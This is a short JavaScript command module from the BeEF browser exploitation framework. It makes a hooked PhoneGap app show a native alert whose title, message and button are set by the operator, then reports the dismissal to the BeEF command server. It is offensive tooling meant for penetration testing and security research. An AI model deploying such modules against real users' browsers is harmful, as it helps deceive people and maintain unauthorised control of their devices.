//
// Copyright (c) 2006-2017 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

// Phonegap_alert_user
//
beef.execute(function() {
    var title = "<%== @title %>";
    var message = "<%== @message %>";
    var buttonName = "<%== @buttonName %>";

   
    function onAlert() {
        result = "Alert dismissed";
        beef.net.send("<%= @command_url %>", <%= @command_id %>, 'result='+result );    
    }

    navigator.notification.alert(
        message,
        onAlert,      
        title,         
	buttonName
    );
  
});
